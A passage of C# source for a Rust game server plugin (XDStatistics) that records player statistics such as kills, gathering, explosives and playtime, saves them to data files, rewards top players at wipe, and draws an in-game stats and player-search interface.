            if (config.settingsPrize.prizeScore.Count == 0)
            {
                config.settingsPrize.prizeScore = new List<Configuration.SettingsPrize.Prize>
                {
                    new Configuration.SettingsPrize.Prize{commandPrizeList = new List<string>{ "say %STEAMID%" }, balancePlusMess = "За топ 1 в категории больше всего очков" },
                    new Configuration.SettingsPrize.Prize{ top = 2, commandPrizeList = new List<string>{ "say %STEAMID%" }, balancePlusMess = "За топ 2 в категории больше всего очков"  },
                };
            }
            if (config.settingsPrize.prizeTime.Count == 0)
            {
                config.settingsPrize.prizeTime = new List<Configuration.SettingsPrize.Prize>
                {
                    new Configuration.SettingsPrize.Prize{commandPrizeList = new List<string>{ "say %STEAMID%" }, balancePlusMess = "За топ 1 в категории большой онлайн"  },
                    new Configuration.SettingsPrize.Prize{ top = 2, commandPrizeList = new List<string>{ "say %STEAMID%" }, balancePlusMess = "За топ 2 в категории большой онлайн" },
                };
            }
            if (config.settingsPrize.prizeNPCKiller.Count == 0)
            {
                config.settingsPrize.prizeNPCKiller = new List<Configuration.SettingsPrize.Prize>
                {
                    new Configuration.SettingsPrize.Prize{commandPrizeList = new List<string>{ "say %STEAMID%" }, balancePlusMess = "За топ 1 в категории убийца NPC" },
                    new Configuration.SettingsPrize.Prize{ top = 2, commandPrizeList = new List<string>{ "say %STEAMID%" }, balancePlusMess = "За топ 2 в категории убийца NPC" },
                };
            }
        }

        protected override void SaveConfig()
        {
            Config.WriteObject(config);
        }

        protected override void LoadDefaultConfig()
        {
            config = new Configuration();
        }
        #endregion

        #region Data
        private static Dictionary<ulong, PlayerInfo> Players = new Dictionary<ulong, PlayerInfo>();
        private static Dictionary<ulong, PlayerInfo> IgnoreReservedPlayer = new Dictionary<ulong, PlayerInfo>();
        private static Dictionary<ulong, List<PrizePlayer>> PrizePlayerData = new Dictionary<ulong, List<PrizePlayer>>();
        
        private class PrizePlayer
        {
            public string Name = string.Empty;
            public CatType catType;
            public int value;
            public int top;
        }

        private class PlayerInfo
        {
            public string Name = string.Empty;
            public bool HidedStatistics = false;

            public float Score = 0;
            public Harvesting harvesting = new Harvesting();
            public OtherStat otherStat = new OtherStat();
            public Explosion explosion = new Explosion();
            public Gather gather = new Gather();
            public Weapon weapon = new Weapon();
            public PVP pVP = new PVP();
            public PlayedTime playedTime = new PlayedTime();

            internal class PlayedTime
            {
                public string DayNumber = DateTime.Now.ToShortDateString();
                public int PlayedForWipe = 0;
                public int PlayedToday = 0;
            }
            internal class Harvesting
            {
                public Dictionary<string, int> HarvestingList = new Dictionary<string, int>();
                public int AllHarvesting = 0;
            }
            internal class OtherStat
            {
                public int CrateOpen = 0;
                public int BarrelDeath = 0;
                public int AllCraft = 0;
                public int BuildingCrate = 0;
                public int AnimalsKill = 0;
            }
            internal class Explosion
            {
                public Dictionary<string, int> ExplosionUsed = new Dictionary<string, int>()
                {
                   ["explosive.timed"] = 0,
                   ["explosive.satchel"] = 0,
                   ["grenade.beancan"] = 0,
                   ["grenade.f1"] = 0,
                   ["ammo.rocket.basic"] = 0,
                   ["ammo.rocket.hv"] = 0,
                   ["ammo.rocket.fire"] = 0,
                   ["ammo.rifle.explosive"] = 0
                };
                public int AllExplosionUsed = 0;
            }
            internal class Gather
            {
                public Dictionary<string, int> GatheredTotal = new Dictionary<string, int>()
                {
                    ["wood"] = 0,
                    ["stones"] = 0,
                    ["metal.ore"] = 0,
                    ["sulfur.ore"] = 0,
                    ["hq.metal.ore"] = 0,
                    ["scrap"] = 0,
                };
                public int AllGathered = 0; 
            }
            internal class Weapon
            {
                public Dictionary<string, WeaponInfo> WeaponUsed = new Dictionary<string, WeaponInfo>();
                internal class WeaponInfo
                {
                    public int Kills = 0;
                    public int Headshots = 0;
                    public int Shots = 0;
                }
            }
            internal class PVP
            {
                public int Kills = 0;
                public int KillsNpc = 0;
                public int Deaths = 0;
                public int Suicides = 0;
                public int Shots = 0;
                public int Headshots = 0;
                public int HeliKill = 0;
                public int BradleyKill = 0;
            }
            public static void AddPlayedTime(ulong id)
            {
                var player = Players.ContainsKey(id) ? Players[id] : null;
                if (player == null)
                    return;
                player.playedTime.PlayedToday++;
                player.playedTime.PlayedForWipe++;
                player.Score += _.config.settingsScore.TimeScore;

                if (player.playedTime.DayNumber != DateTime.Now.ToShortDateString())
                {
                    player.playedTime.PlayedToday = 0;
                    player.playedTime.DayNumber = DateTime.Now.ToShortDateString();
                }
            }
            public static void PlayerClearData(ulong id)
            {
                BasePlayer player = BasePlayer.FindByID(id);
                Players[id] = new PlayerInfo();
                Players[id].Name = player.displayName;
            }
            public static void ClearDataWipe()
            {
                if (IgnoreReservedPlayer != null)
                {
                    foreach (var item in IgnoreReservedPlayer)
                        _.NextTick(() => {
                            IgnoreReservedPlayer[item.Key] = new PlayerInfo();
                        });
                }
                if (Players != null)
                {
                    foreach (var item in Players)
                    {
                        if (item.Value.playedTime.PlayedForWipe <= 300)
                            _.NextTick(() => { Players.Remove(item.Key); });
                        else
                            _.NextTick(() => { Players[item.Key] = new PlayerInfo(); });
                    }
                }         
            }
            public static PlayerInfo Find(ulong id)
            {
                if (Players.ContainsKey(id))
                {
                    return Players[id];
                }

                if (IgnoreReservedPlayer.ContainsKey(id))
                {
                    return IgnoreReservedPlayer[id];
                }

                Players.Add(id, new PlayerInfo());

                if (Players.ContainsKey(id))
                {
                    return Players[id];
                }
                return null;
            }
        }

        private void LoadData() => Players = Interface.GetMod().DataFileSystem.ReadObject<Dictionary<ulong, PlayerInfo>>("XDStatistics/StatsUser");
        private void SaveData() => Interface.GetMod().DataFileSystem.WriteObject("XDStatistics/StatsUser", Players);
        private void LoadDataIgnoreList() => IgnoreReservedPlayer = Interface.GetMod().DataFileSystem.ReadObject<Dictionary<ulong, PlayerInfo>>("XDStatistics/IgnorePlayers");
        private void SaveDataIgnoreList() => Interface.GetMod().DataFileSystem.WriteObject("XDStatistics/IgnorePlayers", IgnoreReservedPlayer);
        private void LoadDataPrize() => PrizePlayerData = Interface.GetMod().DataFileSystem.ReadObject<Dictionary<ulong, List<PrizePlayer>>>("XDStatistics/PlayersReward");
        private void SaveDataPrize() => Interface.GetMod().DataFileSystem.WriteObject("XDStatistics/PlayersReward", PrizePlayerData);
        #endregion

        #region StatHooks     
        private void OnItemCraftFinished(ItemCraftTask task, Item item)
        {
            PlayerInfo Player = PlayerInfo.Find(task.owner.userID);
            Player.otherStat.AllCraft += item.amount;
            Player.Score += config.settingsScore.craftScore;
        }

        private void OnEntityDeath(LootContainer entity, HitInfo info)
        {
            if (entity == null || info == null)
                return;
            BasePlayer player = info.InitiatorPlayer;
            if (player == null)
                return;
            if (entity.ShortPrefabName.Contains("barrel"))
            {
                PlayerInfo Playerstat = PlayerInfo.Find(player.userID);
                Playerstat.otherStat.BarrelDeath++;
                Playerstat.Score += config.settingsScore.barrelScore;
            }
        }

        private void OnEntityBuilt(Planner plan, GameObject go)
        {
            BasePlayer player = plan?.GetOwnerPlayer();
            if (player == null)
                return;

            BaseEntity entity = go?.ToBaseEntity();
            if (entity == null)
                return;

            if (entity.PrefabName.Contains("building core"))
            {
                PlayerInfo Playerstat = PlayerInfo.Find(player.userID);
                Playerstat.otherStat.BuildingCrate++;
                Playerstat.Score += config.settingsScore.BuildingScore;
            }
        }
        private void OnExplosiveThrown(BasePlayer player, BaseEntity entity, ThrownWeapon item)
        {
            if (player == null || item == null)
                return;
            ExplosionProgressAdd(player, entity);
        }
        private void OnWeaponFired(BaseProjectile projectile, BasePlayer player)
        {
            if (projectile == null || player == null)
                return;
            ExplosionProgressAdd(player, null, projectile.primaryMagazine?.ammoType?.shortname);
        }
        private void OnRocketLaunched(BasePlayer player, BaseEntity entity)
        {
            if (player == null || entity == null)
                return;
            ExplosionProgressAdd(player, entity);
        }

        private void OnDispenserBonus(ResourceDispenser dispenser, BaseEntity entity, Item item)
        {
            BasePlayer player = entity.ToPlayer();
            if (player == null)
                return;
            NextTick(() => {
                ProgressAdd(player, item, true);
            });
        }
        private void OnDispenserGather(ResourceDispenser dispenser, BaseEntity entity, Item item)
        {
            BasePlayer player = entity.ToPlayer();
            if (player == null)
                return;
            NextTick(() => {
                ProgressAdd(player, item);
            });
        }
        private void OnCollectiblePickup(Item item, BasePlayer player, CollectibleEntity entity)
        {       
            NextTick(() => {
                if (AlowedSeedId.Contains(item.info.itemid))
                {
                    PlayerInfo Playerstat = PlayerInfo.Find(player.userID);
                    if (!Playerstat.harvesting.HarvestingList.ContainsKey(item.info.shortname))
                    {
                        Playerstat.harvesting.HarvestingList.Add(item.info.shortname, item.amount);
                    }
                    else
                    {
                        Playerstat.harvesting.HarvestingList[item.info.shortname] += item.amount;
                    }
                    Playerstat.harvesting.AllHarvesting += item.amount;
                    Playerstat.Score += config.settingsScore.PlantScore;
                }
                else
                    ProgressAdd(player, item, true);
            });
        }
        private void OnContainerDropItems(ItemContainer container)
        {
            if (container == null)
                return;
            BaseEntity entity = container.entityOwner;
            if (entity == null)
                return;
            if (!entity.ShortPrefabName.Contains("barrel"))
                return;
            foreach (Item lootitem in container.itemList)
            {
                if (lootitem.info.shortname == "scrap")
                    lootitem.skin = 2352567;
            }
        }
        void OnItemPickup(Item item, BasePlayer player)
        {
            if (item == null || item.skin != 2352567)
                return;
            item.skin = 0;
            if (item.info.shortname == "scrap")
                ProgressAdd(player, item);
        }
        private static Dictionary<BasePlayer, List<UInt64>> LootersListCarte = new Dictionary<BasePlayer, List<UInt64>>();
        private void OnLootEntity(BasePlayer player, LootContainer entity)
        {
            if (entity == null || player == null || entity.OwnerID.IsSteamId() || entity.net == null)
                return;
            if (!LootersListCarte.ContainsKey(player))
                LootersListCarte.Add(player, new List<UInt64> { });
            UInt64 netId = entity.net.ID;
            if (LootersListCarte[player].Contains(netId))
                return;
            PlayerInfo Playerstat = PlayerInfo.Find(player.userID);
            Playerstat.otherStat.CrateOpen++;
            foreach (var item in entity.inventory.itemList)
            {
                if(item.info.shortname == "scrap")
                    ProgressAdd(player, item);
            }
            LootersListCarte[player].Add(netId);
        }
        Dictionary<uint, ulong> _heliattacker = new Dictionary<uint, ulong>();
        private void OnEntityTakeDamage(BaseCombatEntity entity, HitInfo info)
        {
            if (entity == null || info == null)
                return;
            if (entity is BaseHelicopter && info.Initiator is BasePlayer)
            {
                BasePlayer player = info.InitiatorPlayer;
                if (player == null)
                    return;
                _heliattacker[entity.net.ID] = player.userID;
            }
        }
        private void OnEntityDeath(BaseCombatEntity entity, HitInfo info)
        {
            try
            {
                if (entity == null || info == null)
                    return;
                BasePlayer player = null;
                if (entity is BaseHelicopter)
                {
                    uint id = entity.net.ID;
                    if (!_heliattacker.ContainsKey(id))
                        return;
                    player = BasePlayer.FindByID(_heliattacker[id]);
                    if (player == null)
                        return;
                    PlayerInfo Playerstat = PlayerInfo.Find(player.userID);
                    Playerstat.pVP.HeliKill++;
                    Playerstat.Score += config.settingsScore.HeliScore;
                    _heliattacker.Remove(id);
                    return;
                }
                if (info.InitiatorPlayer != null)
                    player = info.InitiatorPlayer;
                if (player == null || !player.userID.IsSteamId())
                    return;
                PlayerInfo Playerstat2 = PlayerInfo.Find(player.userID);

                if (entity is NPCPlayer || entity is ScarecrowNPC || entity is Zombie)
                {
                    Playerstat2.pVP.KillsNpc++;
                    Playerstat2.Score += config.settingsScore.NpcScore;
                    if(config.settings.npsDeathUse)
                        WeaponProgressAdd(Playerstat2, info, true);
                    return;
                }

                if (entity is BaseAnimalNPC)
                {
                    Playerstat2.otherStat.AnimalsKill++;
                    Playerstat2.Score += config.settingsScore.AnimalScore;
                    return;
                }

                if (entity is BradleyAPC)
                {
                    Playerstat2.pVP.BradleyKill++;
                    Playerstat2.Score += config.settingsScore.BradleyScore;
                    return;
                }     
            }
            catch (NullReferenceException ex)
            {
            }
        }

        private object OnPlayerDeath(BasePlayer player, HitInfo hitInfo)
        {
            if (player != null)
            {
                if (hitInfo == null || !player.userID.IsSteamId())
                    return null;
                PlayerInfo PlayerstatVic = PlayerInfo.Find(player.userID);
                if (hitInfo.InitiatorPlayer != null)
                {
                    if (!hitInfo.InitiatorPlayer.userID.IsSteamId())
                        return null;
                    BasePlayer initiator = hitInfo.InitiatorPlayer;
                    if (IsFriends(initiator.userID, player.userID))
                        return null;
                    if (IsClans(initiator.UserIDString, player.UserIDString))
                        return null;
                    if (IsDuel(initiator.userID))
                        return null;
                    PlayerInfo PlayerstatInitiator = PlayerInfo.Find(initiator.userID);
                    if (hitInfo.damageTypes.GetMajorityDamageType() == DamageType.Suicide)
                    {
                        PlayerstatVic.pVP.Suicides++;
                        PlayerstatVic.pVP.Deaths++;
                        PlayerstatVic.Score -= config.settingsScore.SuicideScore;
                        return null;
                    }
                    WeaponProgressAdd(PlayerstatInitiator, hitInfo, true);
                    PlayerstatInitiator.pVP.Kills++;
                    PlayerstatInitiator.pVP.Shots++;
                    PlayerstatInitiator.pVP.Headshots += hitInfo.isHeadshot ? 1 : 0;
                    PlayerstatInitiator.Score += config.settingsScore.PlayerScore;
                    PlayerstatVic.pVP.Deaths++;
                    PlayerstatVic.Score -= config.settingsScore.DeathScore;
                }
                else
                {
                    if (hitInfo.damageTypes.GetMajorityDamageType() == DamageType.Suicide)
                        return null;
                    PlayerstatVic.pVP.Deaths++;
                    PlayerstatVic.Score -= config.settingsScore.DeathScore;
                }
            }
            return null;
        }
        private void OnPlayerAttack(BasePlayer attacker, HitInfo hitinfo)
        {
            if (hitinfo == null || attacker == null || hitinfo.HitEntity == null || !attacker.IsConnected)
                return;
            if (hitinfo.HitEntity is BaseNpc)
                return;
            var victim = hitinfo.HitEntity as BasePlayer;
            if (victim == null || !victim.userID.IsSteamId())
                return;
            if (victim == attacker)
                return;
            PlayerInfo PlayerstatInitiator = PlayerInfo.Find(attacker.userID);
            WeaponProgressAdd(PlayerstatInitiator, hitinfo);

            PlayerstatInitiator.pVP.Shots++;
            if (hitinfo.isHeadshot)
                PlayerstatInitiator.pVP.Headshots++;
        }

        void OnGrowableGathered(GrowableEntity plant, Item item, BasePlayer player)
        {
            if (AlowedSeedId.Contains(item.info.itemid))
            {
                NextTick(() =>
                {
                    PlayerInfo Playerstat = PlayerInfo.Find(player.userID);
                    if (!Playerstat.harvesting.HarvestingList.ContainsKey(item.info.shortname))
                    {
                        Playerstat.harvesting.HarvestingList.Add(item.info.shortname, item.amount);
                    }
                    else
                    {
                        Playerstat.harvesting.HarvestingList[item.info.shortname] += item.amount;
                    }
                    Playerstat.harvesting.AllHarvesting += item.amount;
                    Playerstat.Score += config.settingsScore.PlantScore;
                });
            }
        }

        #endregion

        #region BaseHooks
        private void Unload()
        {
            SaveData();
            SaveDataIgnoreList();
            SaveDataPrize();
            foreach (BasePlayer player in BasePlayer.activePlayerList)
                CuiHelper.DestroyUi(player, UI_INTERFACE);
            sb = null;
            _ = null;
        }
        private void Init()
        {
            _ = this;
            sb = new StringBuilder();
            LoadData();
            LoadDataIgnoreList();
            LoadDataPrize();
        }
        private void OnNewSave()
        {
            if (config.settingsPrize.prizeUse)
            {
                ParseTopUserForPrize();
            } 
            if (config.settings.wipeData)
            {
                PlayerInfo.ClearDataWipe();
                NextTick(() => {
                    SaveData();
                    SaveDataIgnoreList();
                });
                PrintWarning(GetLang("STAT_PRINT_WIPE"));
            }
        }
       
        private void OnPlayerConnected(BasePlayer player)
        {
            if (!IgnoreReservedPlayer.ContainsKey(player.userID))
            {
                var dataPlayer = PlayerInfo.Find(player.userID);
                dataPlayer.Name = player.displayName;
                if (dataPlayer.playedTime.DayNumber != DateTime.Now.ToShortDateString())
                {
                    dataPlayer.playedTime.PlayedToday = 0;
                    dataPlayer.playedTime.DayNumber = DateTime.Now.ToShortDateString();
                }
            }
            if (PrizePlayerData.ContainsKey(player.userID))
                SendMsgRewardWipe(player);
            SteamAvatarAdd(player.UserIDString);
        }
        private void OnServerInitialized()
        {
            if (!ImageLibrary)
            {
                NextTick(() => {
                    PrintError($"ERROR! Plugin ImageLibrary not found!");
                    Interface.Oxide.UnloadPlugin(Name);
                });
                return;
            }
            #region LoadItemList
            foreach (var itemDef in ItemManager.GetItemDefinitions())
            {
                Item newItem = ItemManager.CreateByName(itemDef.shortname, 1, 0);

                BaseEntity heldEntity = newItem.GetHeldEntity();
                if (heldEntity != null)
                {
                    prefabID2Item[heldEntity.prefabID] = itemDef.shortname;
                }

                var deployablePrefab = itemDef.GetComponent<ItemModDeployable>()?.entityPrefab?.resourcePath;
                if (string.IsNullOrEmpty(deployablePrefab))
                {
                    continue;
                }

                var shortPrefabName = GameManager.server.FindPrefab(deployablePrefab)?.GetComponent<BaseEntity>()?.ShortPrefabName;
                if (!string.IsNullOrEmpty(shortPrefabName) && !prefabNameItem.ContainsKey(shortPrefabName))
                {
                    prefabNameItem.Add(shortPrefabName, itemDef.shortname);
                }
            }
            #endregion
            foreach (BasePlayer player in BasePlayer.activePlayerList)
                OnPlayerConnected(player);

            timer.Once(60f, CheckInMinute);

            if (config.settings.chatSendTop)
                timer.Once(config.settings.chatSendTopTime, PlayersTopOnChat);

            /*foreach (var item in ItemManager.itemDictionary)
            {
                if (item.Value.category == ItemCategory.Weapon || item.Value.category == ItemCategory.Resources || item.Value.category == ItemCategory.Food || item.Value.category == ItemCategory.Ammunition || item.Value.category == ItemCategory.Tool)
                    if (HasImage(item.Value.shortname) == false)
                            AddImage($"https://rustlabs.com/img/items180/{item.Value.shortname}.png", item.Value.shortname);
            }*/
            if (config.settingsInterface.UsebackgroundImageUrl)
                AddImage(config.settingsInterface.backgroundImageUrl, "CustomBackgroundImage");
                
            AddImage("https://i.imgur.com/hrgfWyQ.png", "1");
            AddImage("https://i.imgur.com/f8f5JvP.png", "2");
            AddImage("https://i.imgur.com/uXkWpqc.png", "3");

            AddImage("https://i.imgur.com/k34NkdO.png", "4");
            AddImage("https://i.imgur.com/Zu5eCrs.png", "5");
            AddImage("https://i.imgur.com/1BHMfvg.png", "6");

            AddImage("https://i.imgur.com/8Zz7UgI.png", "7");
            AddImage("https://i.imgur.com/XqjkkZe.jpg", "10");
            AddImage("https://i.imgur.com/hLBbDvt.jpg", "11");

            AddDisplayName();
            cmd.AddChatCommand(config.settings.chatCommandOpenStat, this, nameof(MainMenuStat));
            cmd.AddConsoleCommand(config.settings.consoleCommandOpenStat, this, nameof(ConsoleCommandOpenMenu));

            #region PermReg
            permission.RegisterPermission(permAdmin, this);
            permission.RegisterPermission(permAvailability, this);
            permission.RegisterPermission(permReset, this);
            #endregion
            timer.Every(config.settings.dataSaveTime * 60, () => { SaveData(); SaveDataIgnoreList(); SaveDataPrize(); });
        }
        #endregion

        #region UI
        public const string UI_INTERFACE = "INTERFACE_STATS";
        public const string UI_MENU_BUTTON = "MENU_BUTTON";
        public const string UI_USER_STAT = "USER_STAT";
        public const string UI_USER_STAT_INFO = "USER_STAT_INFO";
        public const string UI_CLOSE_MENU = "CLOSE_MENU";
        public const string UI_SEARCH_USER = "SEARCH_USER";
        public const string UI_TOP_TEN_USER = "TOP_TEN_USER";

        private void CloseLayer(BasePlayer player)
        {
            CuiHelper.DestroyUi(player, UI_USER_STAT);
            CuiHelper.DestroyUi(player, UI_SEARCH_USER);
            CuiHelper.DestroyUi(player, UI_TOP_TEN_USER);
        }

        #region MainPage
        private void MainMenuStat(BasePlayer player)
        {
            if (IgnoreReservedPlayer.ContainsKey(player.userID))
            {
                PrintToChat(player, GetLang("STAT_ADMIN_HIDE_STAT", player.UserIDString));
                return;
            }
            string background = GetImage("1");
            var container = new CuiElementContainer();
            container.Add(new CuiPanel
            {
                CursorEnabled = true,
                Image = { Color = "0 0 0 0" },
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" }
            }, "Overlay", UI_INTERFACE);

            container.Add(new CuiElement
            {
                Name = "BACKGROUND",
                Parent = UI_INTERFACE,
                Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = background },
                    new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1"}
                }
            });

            container.Add(new CuiElement
            {
                Name = UI_CLOSE_MENU,
                Parent = "BACKGROUND",
                Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = GetImage("3") },
                    new CuiRectTransformComponent { AnchorMin = "1 1", AnchorMax = "1 1", OffsetMin = "-63.354 -36.798", OffsetMax = "-53.246 -27.942" }
                }
            });

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                Button = { Close = UI_INTERFACE, Color = "0 0 0 0" },
                Text = { Text = "" }
            }, UI_CLOSE_MENU);

            CuiHelper.DestroyUi(player, UI_INTERFACE);
            CuiHelper.AddUi(player, container);
            MenuButton(player);
        }
        private void MenuButton(BasePlayer player, int page = 0)
        {
            var container = new CuiElementContainer();
            container.Add(new CuiPanel
            {
                CursorEnabled = false,
                Image = { Color = "1 1 1 0" },
                RectTransform = { AnchorMin = "0.5 1", AnchorMax = "0.5 1", OffsetMin = "-132.238 -75.531", OffsetMax = "122.197 -48.564" }
            }, UI_INTERFACE, UI_MENU_BUTTON);
            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0.5", AnchorMax = "0 0.5", OffsetMin = "-0.001 -13.483", OffsetMax = "88.113 13.484" },
                Button = { Command = $"UI_HandlerStat Page_swap 0", Color = "0 0 0 0" },
                Text = { Text = GetLang("STAT_UI_MY_STAT", player.UserIDString), FontSize = 10, Font = "robotocondensed-regular.ttf", Align = TextAnchor.MiddleCenter }
            }, UI_MENU_BUTTON, "BUTTON_MY_STAT");

            container.Add(new CuiPanel
            {
                CursorEnabled = false,
                Image = { Color = page == 0 ? "0.2988604 0.6886792 0.120194 0.6431373" : "1 1 1 0.3" },
                RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-44.057 -13.483", OffsetMax = "44.057 -11.642" }
            }, "BUTTON_MY_STAT", "Panel_8193");

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-39.106 -13.483", OffsetMax = "65.745 13.484" },
                Button = { Command = $"UI_HandlerStat Page_swap 1", Color = "0 0 0 0" },
                Text = { Text = GetLang("STAT_UI_TOP_TEN", player.UserIDString), FontSize = 10, Font = "robotocondensed-regular.ttf", Align = TextAnchor.MiddleCenter }
            }, UI_MENU_BUTTON, "BUTTON_TOPTEN_USER");

            container.Add(new CuiPanel
            {
                CursorEnabled = false,
                Image = { Color = page == 1 ? "0.2988604 0.6886792 0.120194 0.64313732" : "1 1 1 0.3" },
                RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-52.425 -13.484", OffsetMax = "52.425 -11.642" }
            }, "BUTTON_TOPTEN_USER", "Panel_8193");

            container.Add(new CuiPanel
            {
                CursorEnabled = false,
                Image = { Color = "0 0 0 0" },
                RectTransform = { AnchorMin = "1 0.5", AnchorMax = "1 0.5", OffsetMin = "-61.472 -13.483", OffsetMax = "0.216 13.484" }
            }, UI_MENU_BUTTON, "BUTTON_PAGE_SEARCH");

            container.Add(new CuiPanel
            {
                CursorEnabled = false,
                Image = { Color = page == 2 ? "0.2988604 0.6886792 0.120194 0.6431373" : "1 1 1 0.3" },
                RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-30.844 -13.484", OffsetMax = "30.845 -11.642" }
            }, "BUTTON_PAGE_SEARCH");
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-30.844 -8.36", OffsetMax = "12.862 8.361" },
                Text = { Text = GetLang("STAT_UI_SEARCH", player.UserIDString), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleCenter, Color = "1 1 1 1" }
            }, "BUTTON_PAGE_SEARCH");

            container.Add(new CuiElement
            {
                Parent = "BUTTON_PAGE_SEARCH",
                Components = {
                    new CuiImageComponent { Color = "1 1 1 1", Sprite = "assets/icons/examine.png" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "12.862 -6.5", OffsetMax = "25.862 6.5" }
                }
            });
            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                Button = { Command = $"UI_HandlerStat Page_swap 2", Color = "0 0 0 0" },
                Text = { Text = "" }
            }, "BUTTON_PAGE_SEARCH");

            CuiHelper.DestroyUi(player, UI_MENU_BUTTON);
            CuiHelper.AddUi(player, container);
            if (page == 0)
                UserStat(player);
            else if (page == 1)
                TopTen(player);
            else
                SearchPageUser(player);
        }
        #endregion

        #region SearchPage
        private void SearchPageUser(BasePlayer player, string target = "")
        {
            string SearchName = "";
            var container = new CuiElementContainer();
            container.Add(new CuiPanel
            {
                CursorEnabled = false,
                Image = { Color = "1 1 1 0" },
                RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-378.454 -264.835", OffsetMax = "381.998 266.939" }
            }, UI_INTERFACE, UI_SEARCH_USER);

            container.Add(new CuiElement
            {
                Name = "SEARCH_LINE",
                Parent = UI_SEARCH_USER,
                Components = {
                    new CuiImageComponent { Color = "1 1 1 0.1" },
                    new CuiRectTransformComponent {AnchorMin = "0.5 1", AnchorMax = "0.5 1", OffsetMin = "-181.67 -31.1", OffsetMax = "149.27 -7.1" }
                }
            });

            container.Add(new CuiElement
            {
                Name = "LOUPE_SEARCH_IMG",
                Parent = "SEARCH_LINE",
                Components = {
                    new CuiImageComponent { Color = "1 1 1 1", Sprite = "assets/icons/examine.png" },
                    new CuiRectTransformComponent { AnchorMin = "0 0.5", AnchorMax = "0 0.5", OffsetMin = "13.87 -10", OffsetMax = "33.87 10" }
                }
            });

            container.Add(new CuiElement
            {
                Name = "INPUT_SEARCH",
                Parent = "SEARCH_LINE",
                Components = {
                    new CuiInputFieldComponent { Text = SearchName, Command = $"UI_HandlerStat listplayer {SearchName}", Color = "1 1 1 1", FontSize = 10, Align = TextAnchor.MiddleLeft },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-119.86 -9.314", OffsetMax = "129.03 9.591" }
                }
            });

            container.Add(new CuiPanel
            {
                CursorEnabled = false,
                Image = { Color = "0 0 0 0" },
                RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-181.67 -1.95", OffsetMax = "149.27 212.35" }
            }, UI_SEARCH_USER, "LIST_USER_SEARCH");

            int y = 0, x = 0;
            foreach (var players in Players.Where(z => z.Value.Name.ToLower().Contains(target)))
            {
                string LockStatus = players.Value.HidedStatistics == true ? "assets/icons/lock.png" : "assets/icons/unlock.png";
                string Command = players.Value.HidedStatistics == true ? "" : $"UI_HandlerStat GoStatPlayers {players.Key}";
                if (permission.UserHasPermission(player.UserIDString, permAdmin))
                    Command = $"UI_HandlerStat GoStatPlayers {players.Key}";

                container.Add(new CuiElement
                {
                    Name = "USER_IN_SEARCH",
                    Parent = "LIST_USER_SEARCH",
                    Components = {
                        new CuiImageComponent { Color = "1 1 1 0.1" },
                        new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = $"{-164.971 + (x * 112.586)} {84.138 - (y * 26.281)}", OffsetMax = $"{-62.801 + (x * 112.586)} {105.623 - (y * 26.281)}" }
                    }
                });

                container.Add(new CuiElement
                {
                    Name = "USER_HIDE_PROFILE",
                    Parent = "USER_IN_SEARCH",
                    Components = {
                    new CuiImageComponent { Color = "1 1 1 1", Sprite = LockStatus },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-45.68 -7.5", OffsetMax = "-30.68 7.5" }
                }
                });
                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-26.832 -10.743", OffsetMax = "48.365 10.743" },
                    Text = { Text = GetCorrectName(players.Value.Name, 14), Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" }
                }, "USER_IN_SEARCH");

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Button = { Command = Command, Color = "0 0 0 0" },
                    Text = { Text = ""}
                }, "USER_IN_SEARCH");

                x++;
                if (x == 3)
                {
                    x = 0;
                    y++;
                    if (y == 8)
                        break;
                }
            }
            CloseLayer(player);
            CuiHelper.AddUi(player, container);
        }
        #endregion

        #region UserInfoPage
        private void UserStat(BasePlayer player, ulong target = 0)
        {
            PlayerInfo statInfo = PlayerInfo.Find(target == 0 ? player.userID : target);
            ulong userid = target == 0 ? player.userID : target;
            string color = BasePlayer.FindByID(userid) != null ? "0.55 0.78 0.24 1" : "0.8 0.28 0.2 1";
            int kills = config.settings.pveServerMode ? statInfo.pVP.KillsNpc : statInfo.pVP.Kills;
            string titleKills = config.settings.pveServerMode ? GetLang("STAT_UI_PVP_KILLS_NPC", player.UserIDString) : GetLang("STAT_UI_PVP_KILLS", player.UserIDString);
            var container = new CuiElementContainer();
            container.Add(new CuiPanel
            {
                CursorEnabled = false,
                Image = { Color = "0 0 0 0" },
                RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-400.254 -331.554", OffsetMax = "393.974 274.446" }
            }, UI_INTERFACE, UI_USER_STAT);

            container.Add(new CuiPanel
            {
                CursorEnabled = false,
                Image = { Color = "0 0 0 0" },
                RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-400.254 -331.554", OffsetMax = "393.974 274.446" }
            }, UI_USER_STAT, UI_USER_STAT_INFO);

